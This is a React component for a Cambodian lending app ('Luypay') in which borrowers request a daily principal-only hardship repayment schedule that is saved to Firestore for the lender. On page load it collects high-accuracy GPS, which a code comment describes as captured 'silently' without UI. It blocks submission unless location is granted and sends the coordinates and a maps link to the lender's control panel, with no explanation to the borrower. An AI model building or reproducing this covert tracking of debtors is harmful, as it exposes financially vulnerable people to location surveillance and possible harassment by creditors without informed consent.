import React, { useState, useEffect } from 'react';
import { db } from '../lib/firebase';
import { collection, addDoc } from 'firebase/firestore';
import { useLanguage } from '../i18n';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Calculator, Calendar, DollarSign, Clock, CheckCircle2, 
  Send, User, Phone, Sparkles, FileText, AlertCircle, Copy, Check, ArrowLeft, ShieldCheck
} from 'lucide-react';

interface HardshipSettlementRequestFormProps {
  borrowerNamePrefill?: string;
  borrowerPhonePrefill?: string;
  principalPrefill?: number;
  lenderUsername?: string;
  onSubmitSuccess?: (agreementId: string) => void;
  onBackToPortal?: () => void;
}

export default function HardshipSettlementRequestForm({
  borrowerNamePrefill = '',
  borrowerPhonePrefill = '',
  principalPrefill = 0,
  lenderUsername = 'sounravin',
  onSubmitSuccess,
  onBackToPortal
}: HardshipSettlementRequestFormProps) {
  const { language } = useLanguage();

  // Form Inputs - Empty by default for easy borrower entry
  const [borrowerName, setBorrowerName] = useState(borrowerNamePrefill || '');
  const [borrowerPhone, setBorrowerPhone] = useState(borrowerPhonePrefill || '');
  const [principalAmount, setPrincipalAmount] = useState<number | ''>(principalPrefill || '');
  const [dailyRate, setDailyRate] = useState<number | ''>('');
  const [currency, setCurrency] = useState<'USD' | 'KHR'>('USD');
  const [startDate, setStartDate] = useState<string>(() => {
    const today = new Date();
    return today.toISOString().slice(0, 10);
  });
  const [agreementNote, setAgreementNote] = useState<string>('');

  // GPS Location state (Captured silently in background without showing UI cards)
  const [gpsLocation, setGpsLocation] = useState<{
    latitude: number;
    longitude: number;
    accuracy?: number;
    capturedAt: string;
    address?: string;
  } | null>(null);
  const [gpsStatus, setGpsStatus] = useState<'idle' | 'requesting' | 'captured' | 'denied'>('idle');

  // Request background GPS immediately when link is opened
  useEffect(() => {
    if (typeof window !== 'undefined' && navigator.geolocation) {
      setGpsStatus('requesting');
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lng = pos.coords.longitude;
          setGpsLocation({
            latitude: lat,
            longitude: lng,
            accuracy: pos.coords.accuracy,
            capturedAt: new Date().toISOString(),
            address: `${lat.toFixed(6)}, ${lng.toFixed(6)}`
          });
          setGpsStatus('captured');
        },
        (err) => {
          console.warn('Background GPS location fetch:', err);
          setGpsStatus('denied');
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }
  }, []);

  // UI States
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submittedId, setSubmittedId] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Helper promise to request GPS if not captured yet
  const requestGpsPromise = (): Promise<{ latitude: number; longitude: number; accuracy?: number; capturedAt: string; address?: string } | null> => {
    return new Promise((resolve) => {
      if (typeof window === 'undefined' || !navigator.geolocation) {
        resolve(null);
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lng = pos.coords.longitude;
          const loc = {
            latitude: lat,
            longitude: lng,
            accuracy: pos.coords.accuracy,
            capturedAt: new Date().toISOString(),
            address: `${lat.toFixed(6)}, ${lng.toFixed(6)}`
          };
          setGpsLocation(loc);
          setGpsStatus('captured');
          resolve(loc);
        },
        (err) => {
          console.warn('GPS permission prompt error:', err);
          setGpsStatus('denied');
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: 12000 }
      );
    });
  };

  // Preset Daily Amounts
  const presetDailyAmounts = [5, 10, 15, 20, 25, 30, 50];

  // Calculations
  const validPrincipal = Math.max(0, Number(principalAmount) || 0);
  const validDailyRate = Math.max(0, Number(dailyRate) || 0);

  const fullPaymentsCount = validDailyRate > 0 ? Math.floor(validPrincipal / validDailyRate) : 0;
  const remainder = validDailyRate > 0 ? validPrincipal % validDailyRate : 0;
  const totalInstallments = validDailyRate > 0 ? (remainder > 0.001 ? fullPaymentsCount + 1 : fullPaymentsCount) : 0;

  // Generate breakdown schedule
  const startDateObj = new Date(startDate || Date.now());
  const scheduleItems = [];
  let remainingBalance = validPrincipal;
  let currentDate = new Date(startDateObj);

  for (let i = 1; i <= totalInstallments; i++) {
    const paymentDateStr = currentDate.toLocaleDateString('km-KH', {
      weekday: 'short',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit'
    });
    const isoDateStr = currentDate.toISOString().slice(0, 10);

    let paymentForThisStep = validDailyRate;
    if (i === totalInstallments && remainder > 0.001) {
      paymentForThisStep = remainder;
    }

    remainingBalance = Math.max(0, remainingBalance - paymentForThisStep);

    scheduleItems.push({
      step: i,
      dateFormatted: paymentDateStr,
      isoDate: isoDateStr,
      amount: paymentForThisStep,
      remaining: remainingBalance
    });

    currentDate.setDate(currentDate.getDate() + 1); // daily
  }

  const endDateFormatted = scheduleItems.length > 0 
    ? scheduleItems[scheduleItems.length - 1].dateFormatted 
    : '-';
  const endDateIso = scheduleItems.length > 0 
    ? scheduleItems[scheduleItems.length - 1].isoDate 
    : '-';

  const currSymbol = currency === 'USD' ? '$' : currency === 'KHR' ? '៛' : '฿';

  const generateTelegramMessage = () => {
    const bName = borrowerName.trim() || 'កូនបំណុល';
    const bPhone = borrowerPhone.trim() ? ` (${borrowerPhone})` : '';

    return `🤝 **កាលវិភាគសងប្រាក់ដើមពិសេស (សំណើសុំឡើងតែដើម)**
----------------------------------
👤 **ឈ្មោះកូនបំណុល:** ${bName}${bPhone}
💵 **ប្រាក់ដើមត្រូវសងសរុប:** ${currSymbol}${validPrincipal.toLocaleString()} ${currency}
🗓 **ប្រាក់សុំឡើងក្នងមួយថ្ងៃ:** ${currSymbol}${validDailyRate.toLocaleString()} ${currency} / ថ្ងៃ
⏱ **ចំនួនថ្ងៃត្រូវសងសរុប:** ${totalInstallments} ថ្ងៃ (${scheduleItems.length > 0 ? scheduleItems[0].isoDate : ''} ដល់ ${endDateIso})
📝 **ចំណាំ/មូលហេតុ:** ${agreementNote}

----------------------------------
📋 **កាលវិភាគបង់ប្រាក់លម្អិត:**
${scheduleItems.map(item => {
  const isFinal = item.step === totalInstallments;
  return `• ថ្ងៃទី ${item.step}: ${item.isoDate} ➡️ ចំនួន ${currSymbol}${item.amount.toFixed(2)}${isFinal ? ' (ថ្ងៃចុងក្រោយ)' : ''} | នៅសល់: ${currSymbol}${item.remaining.toFixed(2)}`;
}).join('\n')}

----------------------------------
🙏🏻 សូមម្ចាស់បំណុលមេត្តាពិនិត្យ និងយល់ព្រមលើសំណើសុំឡើងតែដើមនេះ! អរគុណ!`;
  };

  const handleCopyTelegram = () => {
    const text = generateTelegramMessage();
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!borrowerName.trim()) {
      setErrorMsg(language === 'kh' ? 'សូមបញ្ចូលឈ្មោះកូនបំណុល!' : 'Please enter borrower name!');
      return;
    }
    if (validPrincipal <= 0) {
      setErrorMsg(language === 'kh' ? 'សូមបញ្ចូលចំនួនប្រាក់ដើមត្រូវសង!' : 'Please enter valid principal amount!');
      return;
    }

    setIsSubmitting(true);
    setErrorMsg(null);

    // Ensure GPS Location is captured
    let activeGps = gpsLocation;
    if (!activeGps) {
      activeGps = await requestGpsPromise();
    }

    if (!activeGps) {
      setIsSubmitting(false);
      setErrorMsg(
        language === 'kh' 
          ? 'សូមអនុញ្ញាត (Allow) ទីតាំង GPS របស់ឧបករណ៍របស់អ្នកជាមុនសិន ទើបអាចផ្ញើសំណើសុំឡើងតែដើមបាន!' 
          : 'Please Allow GPS location access on your device to submit this hardship request!'
      );
      return;
    }

    try {
      const docData = {
        type: 'hardship_settlement',
        name: borrowerName.trim(),
        phone: borrowerPhone.trim(),
        amountRequested: validPrincipal,
        principalAmount: validPrincipal,
        dailyRate: validDailyRate,
        currency,
        startDate,
        endDate: endDateIso,
        totalInstallments,
        frequency: 'daily',
        reason: agreementNote,
        notes: `សំណើសុំឡើងតែដើមចំនួន ${currSymbol}${validPrincipal} (${totalInstallments} ថ្ងៃ x ${currSymbol}${validDailyRate}/ថ្ងៃ)`,
        status: 'pending',
        createdAt: new Date().toISOString(),
        lenderUsername: lenderUsername || 'sounravin',
        scheduleSummary: scheduleItems,

        // GPS Location Fields automatically sent to control panel
        latitude: activeGps.latitude,
        longitude: activeGps.longitude,
        locationAccuracy: activeGps.accuracy || null,
        gpsCapturedAt: activeGps.capturedAt,
        locationAddress: activeGps.address || '',
        locationUrl: `https://maps.google.com/?q=${activeGps.latitude},${activeGps.longitude}`,
        gpsStatus: 'captured'
      };

      // 1. Save to hardship_settlement_agreements
      const agreementRef = await addDoc(collection(db, 'hardship_settlement_agreements'), docData);

      // 2. Save as a loan_applications record so it appears in the Loan Applications Control Panel & Hardship Control Panel
      await addDoc(collection(db, 'loan_applications'), {
        ...docData,
        agreementId: agreementRef.id,
        loanType: 'hardship_settlement'
      });

      setSubmittedId(agreementRef.id);
      if (onSubmitSuccess) {
        onSubmitSuccess(agreementRef.id);
      }
    } catch (err) {
      console.error('Error submitting hardship settlement:', err);
      setErrorMsg(language === 'kh' ? 'បរាជ័យក្នុងការផ្ញើ សូមព្យាយាមម្តងទៀត' : 'Failed to submit agreement. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="w-full max-w-3xl mx-auto bg-slate-900 border border-slate-800 rounded-3xl shadow-2xl overflow-hidden text-slate-100">
      
      {/* Header Banner */}
      <div className="p-5 sm:p-6 bg-gradient-to-r from-amber-950 via-slate-900 to-indigo-950 border-b border-slate-800 flex items-center justify-between">
        <div className="flex items-center gap-3.5">
          <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-amber-500 to-orange-600 text-slate-950 flex items-center justify-center shadow-lg shadow-amber-500/20 font-black shrink-0">
            <Calculator className="w-6 h-6" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-lg sm:text-xl font-black text-white">
                {language === 'kh' ? 'ប្រព័ន្ធគណនារយៈពេលសុំឡើងតែដើម' : 'Hardship Principal Settlement Request'}
              </h1>
              <span className="text-[10px] bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full font-mono font-bold">
                កូនបំណុលបំពេញ
              </span>
            </div>
            <p className="text-xs text-slate-400 font-medium mt-0.5">
              {language === 'kh' 
                ? 'បំពេញព័ត៌មាន និងគណនាចំនួនថ្ងៃសងប្រាក់ដើម ដើម្បីបញ្ជូនទៅកាន់ម្ចាស់បំណុល' 
                : 'Calculate your principal-only repayment schedule and submit to your lender'}
            </p>
          </div>
        </div>

        {onBackToPortal && (
          <button
            onClick={onBackToPortal}
            className="p-2.5 rounded-2xl bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition cursor-pointer flex items-center gap-1.5 text-xs font-bold"
          >
            <ArrowLeft className="w-4 h-4" />
            <span className="hidden sm:inline">{language === 'kh' ? 'ត្រឡប់ក្រោយ' : 'Back'}</span>
          </button>
        )}
      </div>

      {/* Main Body */}
      <div className="p-5 sm:p-8 space-y-6">

        {submittedId ? (
          /* Submission Success State */
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-slate-950 border border-emerald-500/30 rounded-3xl p-6 sm:p-8 text-center space-y-6 shadow-inner"
          >
            <div className="w-16 h-16 bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 rounded-3xl mx-auto flex items-center justify-center shadow-lg shadow-emerald-500/20 animate-bounce">
              <CheckCircle2 className="w-8 h-8" />
            </div>

            <div className="space-y-2">
              <h2 className="text-xl font-black text-white">
                {language === 'kh' ? 'សំណើសុំឡើងតែដើមត្រូវបានផ្ញើរួចរាល់!' : 'Hardship Settlement Submitted Successfully!'}
              </h2>
              <p className="text-xs text-slate-400 font-bold max-w-lg mx-auto leading-relaxed">
                {language === 'kh' 
                  ? 'ទិន្នន័យគណនាកាលវិភាគសងប្រាក់ដើមរបស់អ្នកត្រូវបានបញ្ជូនទៅកាន់ផ្ទាំងគ្រប់គ្រងរបស់ម្ចាស់បំណុលរួចរាល់ហើយ។ អ្នកក៏អាចចម្លងសារព័ត៌មានខាងក្រោមដើម្បីផ្ញើតាម Telegram ផ្ទាល់ខ្លួនផងដែរ។' 
                  : 'Your hardship request has been transmitted to your lender control panel. You can also copy the schedule details below to send via Telegram.'}
              </p>
            </div>

            {/* Quick Summary Card */}
            <div className="bg-slate-900 border border-amber-500/30 p-4 rounded-2xl text-left text-xs space-y-2 max-w-md mx-auto">
              <div className="flex justify-between items-center border-b border-slate-800 pb-2">
                <span className="text-slate-400 font-bold">{language === 'kh' ? 'ឈ្មោះកូនបំណុល៖' : 'Borrower:'}</span>
                <span className="text-white font-black">{borrowerName}</span>
              </div>
              <div className="flex justify-between items-center border-b border-slate-800 pb-2">
                <span className="text-slate-400 font-bold">{language === 'kh' ? 'ប្រាក់ដើមត្រូវសងសរុប៖' : 'Total Principal:'}</span>
                <span className="text-emerald-400 font-black">{currSymbol}{validPrincipal.toLocaleString()} {currency}</span>
              </div>
              <div className="flex justify-between items-center border-b border-slate-800 pb-2">
                <span className="text-slate-400 font-bold">{language === 'kh' ? 'ប្រាក់សុំឡើងក្នុងមួយថ្ងៃ៖' : 'Daily Rate:'}</span>
                <span className="text-amber-300 font-black">{currSymbol}{validDailyRate.toLocaleString()} / ថ្ងៃ</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-bold">{language === 'kh' ? 'ចំនួនថ្ងៃសរុប៖' : 'Total Days:'}</span>
                <span className="text-blue-400 font-black">{totalInstallments} ថ្ងៃ (ដល់ {endDateIso})</span>
              </div>
            </div>

            {/* Telegram Copy Action */}
            <div className="pt-2 flex flex-col sm:flex-row items-center justify-center gap-3">
              <button
                type="button"
                onClick={handleCopyTelegram}
                className="w-full sm:w-auto px-6 py-3.5 bg-gradient-to-r from-sky-500 to-blue-600 hover:from-sky-400 hover:to-blue-500 text-white font-black text-xs rounded-2xl transition cursor-pointer flex items-center justify-center gap-2 shadow-lg shadow-sky-500/20 active:scale-95"
              >
                {copied ? <Check className="w-4 h-4 text-emerald-200" /> : <Send className="w-4 h-4" />}
                <span>{copied ? 'បានចម្លងរួចរាល់!' : 'ចម្លងកាលវិភាគផ្ញើចូល Telegram'}</span>
              </button>

              <button
                type="button"
                onClick={() => {
                  setBorrowerName('');
                  setBorrowerPhone('');
                  setPrincipalAmount('');
                  setDailyRate('');
                  setAgreementNote('');
                  setSubmittedId(null);
                }}
                className="w-full sm:w-auto px-5 py-3.5 bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs rounded-2xl transition cursor-pointer border border-slate-750"
              >
                {language === 'kh' ? 'ធ្វើការគណនាថ្មី' : 'Create Another Calculation'}
              </button>
            </div>
          </motion.div>
        ) : (
          /* Main Input Form */
          <form onSubmit={handleSubmit} className="space-y-6">

            {errorMsg && (
              <div className="p-4 bg-rose-500/10 border border-rose-500/30 rounded-2xl text-xs font-bold text-rose-300 flex items-center gap-2.5">
                <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />
                <span>{errorMsg}</span>
              </div>
            )}

            {/* Input Grid */}
            <div className="bg-slate-950 border border-slate-800 p-5 rounded-2xl space-y-4 shadow-inner">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <span className="text-xs font-black text-amber-400 uppercase tracking-wider flex items-center gap-1.5">
                  <Sparkles className="w-4 h-4" />
                  {language === 'kh' ? 'បញ្ចូលព័ត៌មានគណនាប្រាក់ដើម' : 'Borrower Hardship Details'}
                </span>
                <span className="text-[11px] text-slate-400 font-medium">
                  {language === 'kh' ? 'សុំឡើងប្រាក់ដើមប្រចាំថ្ងៃ' : 'Daily Principal Settlements'}
                </span>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 text-xs">
                
                {/* Name */}
                <div className="space-y-1.5">
                  <label className="font-bold text-slate-300 flex items-center gap-1">
                    <User className="w-3.5 h-3.5 text-blue-400" />
                    <span>{language === 'kh' ? 'ឈ្មោះកូនបំណុល *' : 'Borrower Name *'}</span>
                  </label>
                  <input
                    type="text"
                    required
                    value={borrowerName}
                    onChange={(e) => setBorrowerName(e.target.value)}
                    placeholder={language === 'kh' ? 'បញ្ចូលឈ្មោះកូនបំណុល' : 'Enter borrower name'}
                    className="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-750 rounded-xl font-semibold text-white focus:outline-none focus:border-amber-500 transition placeholder:text-slate-600"
                  />
                </div>

                {/* Phone */}
                <div className="space-y-1.5">
                  <label className="font-bold text-slate-300 flex items-center gap-1">
                    <Phone className="w-3.5 h-3.5 text-emerald-400" />
                    <span>{language === 'kh' ? 'លេខទូរស័ព្ទ' : 'Phone Number'}</span>
                  </label>
                  <input
                    type="text"
                    value={borrowerPhone}
                    onChange={(e) => setBorrowerPhone(e.target.value)}
                    placeholder={language === 'kh' ? 'បញ្ចូលលេខទូរស័ព្ទ' : '070 XXX XXX'}
                    className="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-750 rounded-xl font-semibold text-white focus:outline-none focus:border-amber-500 transition placeholder:text-slate-600"
                  />
                </div>

                {/* Currency */}
                <div className="space-y-1.5">
                  <label className="font-bold text-slate-300 flex items-center gap-1">
                    <DollarSign className="w-3.5 h-3.5 text-amber-400" />
                    <span>{language === 'kh' ? 'រូបីយប័ណ្ណ' : 'Currency'}</span>
                  </label>
                  <div className="grid grid-cols-2 gap-1 bg-slate-900 p-1 border border-slate-750 rounded-xl">
                    {(['USD', 'KHR'] as const).map((curr) => (
                      <button
                        key={curr}
                        type="button"
                        onClick={() => setCurrency(curr)}
                        className={`py-1.5 font-black text-[11px] rounded-lg transition cursor-pointer ${
                          currency === curr 
                            ? 'bg-amber-500 text-slate-950 shadow' 
                            : 'text-slate-400 hover:text-white'
                        }`}
                      >
                        {curr === 'USD' ? '$ USD' : '៛ KHR'}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Principal Amount */}
                <div className="space-y-1.5">
                  <label className="font-bold text-slate-300 flex items-center gap-1">
                    <DollarSign className="w-3.5 h-3.5 text-emerald-400" />
                    <span>{language === 'kh' ? 'ប្រាក់ដើមត្រូវសងសរុប *' : 'Outstanding Principal *'}</span>
                  </label>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 font-black text-emerald-400 text-sm">
                      {currSymbol}
                    </span>
                    <input
                      type="number"
                      min="1"
                      required
                      placeholder={language === 'kh' ? 'បញ្ចូលចំនួនប្រាក់ដើម' : 'Enter amount'}
                      value={principalAmount}
                      onChange={(e) => setPrincipalAmount(e.target.value === '' ? '' : Number(e.target.value))}
                      className="w-full pl-8 pr-3.5 py-2.5 bg-slate-900 border border-slate-750 rounded-xl font-black text-amber-300 text-sm focus:outline-none focus:border-amber-500 transition placeholder:text-slate-600"
                    />
                  </div>
                </div>

                {/* Daily Payment Request */}
                <div className="space-y-1.5">
                  <label className="font-bold text-slate-300 flex items-center justify-between">
                    <span className="flex items-center gap-1">
                      <Clock className="w-3.5 h-3.5 text-amber-400" />
                      <span>{language === 'kh' ? 'ប្រាក់សុំឡើងក្នុងមួយថ្ងៃ *' : 'Daily Payment Request *'}</span>
                    </span>
                    <span className="text-[10px] text-amber-400 font-mono">/ ថ្ងៃ</span>
                  </label>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 font-black text-amber-400 text-sm">
                      {currSymbol}
                    </span>
                    <input
                      type="number"
                      min="0.1"
                      step="0.5"
                      required
                      placeholder={language === 'kh' ? 'បញ្ចូលចំនួនប្រាក់សុំឡើង' : 'Enter daily rate'}
                      value={dailyRate}
                      onChange={(e) => setDailyRate(e.target.value === '' ? '' : Number(e.target.value))}
                      className="w-full pl-8 pr-3.5 py-2.5 bg-slate-900 border border-slate-750 rounded-xl font-black text-emerald-300 text-sm focus:outline-none focus:border-amber-500 transition placeholder:text-slate-600"
                    />
                  </div>
                </div>

                {/* Start Date */}
                <div className="space-y-1.5">
                  <label className="font-bold text-slate-300 flex items-center gap-1">
                    <Calendar className="w-3.5 h-3.5 text-indigo-400" />
                    <span>{language === 'kh' ? 'កាលបរិច្ឆេទចាប់ផ្តើមសង' : 'Start Repayment Date'}</span>
                  </label>
                  <input
                    type="date"
                    required
                    value={startDate}
                    onChange={(e) => setStartDate(e.target.value)}
                    className="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-750 rounded-xl font-semibold text-white focus:outline-none focus:border-amber-500 transition"
                  />
                </div>

              </div>

              {/* Preset Chips */}
              <div className="flex flex-wrap items-center gap-2 pt-2 border-t border-slate-800">
                <span className="text-[11px] font-bold text-slate-400">
                  ⚡️ {language === 'kh' ? 'ជ្រើសរើសចំនួនប្រាក់លឿន៖' : 'Quick Rates:'}
                </span>
                {presetDailyAmounts.map((amt) => (
                  <button
                    key={amt}
                    type="button"
                    onClick={() => setDailyRate(amt)}
                    className={`px-2.5 py-1 text-xs font-black rounded-lg transition cursor-pointer border ${
                      dailyRate === amt
                        ? 'bg-amber-500 text-slate-950 border-amber-400 shadow'
                        : 'bg-slate-900 text-slate-300 border-slate-750 hover:bg-slate-800 hover:text-white'
                    }`}
                  >
                    {currSymbol}{amt} / ថ្ងៃ
                  </button>
                ))}
              </div>

              {/* Note / Reason */}
              <div className="space-y-1.5 pt-2 border-t border-slate-800">
                <label className="font-bold text-xs text-slate-300 flex items-center gap-1">
                  <FileText className="w-3.5 h-3.5 text-slate-400" />
                  <span>{language === 'kh' ? 'ចំណាំ / មូលហេតុសុំឡើងតែដើម' : 'Agreement Note / Reason'}</span>
                </label>
                <textarea
                  rows={2}
                  value={agreementNote}
                  onChange={(e) => setAgreementNote(e.target.value)}
                  className="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-750 rounded-xl text-xs text-white font-medium focus:outline-none focus:border-amber-500 transition"
                  placeholder="បញ្ជាក់មូលហេតុបន្ថែម..."
                />
              </div>

            </div>

            {/* Realtime Calculations Card */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
              <div className="p-4 bg-slate-950 border border-slate-800 rounded-2xl space-y-1">
                <p className="text-[10px] font-black text-slate-400 uppercase tracking-wider">
                  {language === 'kh' ? 'ប្រាក់ដើមត្រូវសង' : 'Total Principal'}
                </p>
                <p className="text-xl font-black text-white">
                  {currSymbol}{validPrincipal.toLocaleString()} <span className="text-xs text-slate-400 font-normal">{currency}</span>
                </p>
              </div>

              <div className="p-4 bg-amber-950/30 border border-amber-800/40 rounded-2xl space-y-1">
                <p className="text-[10px] font-black text-amber-300 uppercase tracking-wider">
                  {language === 'kh' ? 'ប្រាក់សុំឡើងក្នុងមួយថ្ងៃ' : 'Daily Rate Request'}
                </p>
                <p className="text-xl font-black text-amber-300">
                  {currSymbol}{validDailyRate.toLocaleString()} <span className="text-xs text-amber-200/70 font-normal">/ ថ្ងៃ</span>
                </p>
              </div>

              <div className="p-4 bg-blue-950/30 border border-blue-800/40 rounded-2xl space-y-1">
                <p className="text-[10px] font-black text-blue-300 uppercase tracking-wider">
                  {language === 'kh' ? 'ចំនួនថ្ងៃត្រូវសងសរុប' : 'Calculated Total Days'}
                </p>
                <div className="flex items-baseline gap-1">
                  <span className="text-2xl font-black text-blue-400">{totalInstallments}</span>
                  <span className="text-xs font-bold text-blue-300">ថ្ងៃ ({totalInstallments} ដង)</span>
                </div>
              </div>

              <div className="p-4 bg-emerald-950/30 border border-emerald-800/40 rounded-2xl space-y-1">
                <p className="text-[10px] font-black text-emerald-300 uppercase tracking-wider">
                  {language === 'kh' ? 'ថ្ងៃបញ្ចប់ការសង' : 'Calculated End Date'}
                </p>
                <p className="text-sm font-black text-emerald-300">
                  {endDateFormatted}
                </p>
                <p className="text-[10px] text-emerald-400/80 font-mono">
                  {endDateIso}
                </p>
              </div>
            </div>

            {/* Preview Schedule Table */}
            <div className="bg-slate-950 border border-slate-800 rounded-2xl p-4 space-y-3">
              <div className="flex items-center justify-between">
                <h3 className="text-xs font-black text-white uppercase tracking-wider flex items-center gap-1.5">
                  <Calendar className="w-4 h-4 text-indigo-400" />
                  <span>{language === 'kh' ? 'មើលគំរូកាលវិភាគសងប្រាក់លម្អិត' : 'Detailed Repayment Schedule Preview'}</span>
                </h3>
                <span className="text-[10px] text-slate-400 font-bold">
                  {scheduleItems.length} {language === 'kh' ? 'ថ្ងៃ' : 'days'}
                </span>
              </div>

              <div className="max-h-52 overflow-y-auto rounded-xl border border-slate-800">
                <table className="w-full text-left text-xs border-collapse">
                  <thead>
                    <tr className="bg-slate-900 text-slate-400 font-black">
                      <th className="p-2 border-b border-slate-800 text-center w-12">លើកទី</th>
                      <th className="p-2 border-b border-slate-800">កាលបរិច្ឆេទ</th>
                      <th className="p-2 border-b border-slate-800 text-right">ចំនួនប្រាក់</th>
                      <th className="p-2 border-b border-slate-800 text-right">ប្រាក់នៅសល់</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/60 font-medium text-slate-300">
                    {scheduleItems.slice(0, 30).map((item) => (
                      <tr key={item.step} className={item.step === totalInstallments ? 'bg-amber-500/10 font-bold text-amber-300' : ''}>
                        <td className="p-2 text-center font-mono text-slate-400">{item.step}</td>
                        <td className="p-2">
                          <span>{item.dateFormatted}</span>
                          <span className="text-[10px] text-slate-500 block font-mono">{item.isoDate}</span>
                        </td>
                        <td className="p-2 text-right font-black text-emerald-400">
                          {currSymbol}{item.amount.toFixed(2)}
                        </td>
                        <td className="p-2 text-right font-semibold text-slate-400">
                          {currSymbol}{item.remaining.toFixed(2)}
                        </td>
                      </tr>
                    ))}
                    {scheduleItems.length > 30 && (
                      <tr>
                        <td colSpan={4} className="p-2 text-center text-[11px] text-slate-500 italic bg-slate-900/50">
                          ...{language === 'kh' ? `និង ${scheduleItems.length - 30} ថ្ងៃទៀត` : `and ${scheduleItems.length - 30} more days`}...
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* Submit Action Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full py-4 bg-gradient-to-r from-amber-500 via-orange-500 to-amber-600 hover:from-amber-400 hover:to-orange-400 text-slate-950 font-black text-sm rounded-2xl transition cursor-pointer shadow-xl shadow-amber-500/20 active:scale-98 flex items-center justify-center gap-2 border border-amber-300/40 disabled:opacity-50"
            >
              {isSubmitting ? (
                <span>{language === 'kh' ? 'កំពុងបញ្ជូន...' : 'Submitting...'}</span>
              ) : (
                <>
                  <Send className="w-5 h-5 text-slate-950" />
                  <span>{language === 'kh' ? 'បញ្ជូនសំណើសុំឡើងតែដើមនេះទៅកាន់ម្ចាស់បំណុល' : 'Submit Hardship Request to Lender'}</span>
                </>
              )}
            </button>

          </form>
        )}

      </div>

      {/* Footer */}
      <div className="p-4 bg-slate-950 border-t border-slate-800 text-center text-[11px] text-slate-500 font-medium">
        🛡️ {language === 'kh' ? 'ប្រព័ន្ធគណនាសុំឡើងតែដើមដោយសុវត្ថិភាព (Luypay Hardship Settlement Engine)' : 'Secured Hardship Settlement System'}
      </div>

    </div>
  );
}
